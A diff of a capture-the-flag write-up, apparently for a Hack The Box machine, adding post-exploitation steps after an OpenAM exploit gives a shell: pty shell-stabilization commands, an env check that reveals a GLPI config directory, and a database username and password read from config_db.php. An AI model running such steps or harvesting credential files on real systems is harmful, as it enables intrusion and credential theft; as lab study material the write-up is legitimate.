@@ -140,8 +140,12 @@ python3 exploit.py --url https://sso.management.htb/openam/ui/PWResetUserValidat
 We get shell as user `openham`
 STABILIZE THE SHELL 
 ```bash 
-python3 -c 'import pty;pty.spawn("/bi)'
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+CTRL+Z
+stty raw -echo;fg
+export TERM=xterm-256color
 ```
+
 ### Exploitation
 
 ```bash
@@ -149,7 +153,8 @@ env
 ```
 exposes a config dir `PWD=/opt/glpi/config`
 under the 
-- `glpi` theres db creds, `config_db.php` capturing 
+- `glpi` theres db creds, `config_db.php` capturing user(`glpi`) and pass(`8rhu0L6Pw4Y7`)
+- 
 
 Got a shell as `username`.
 
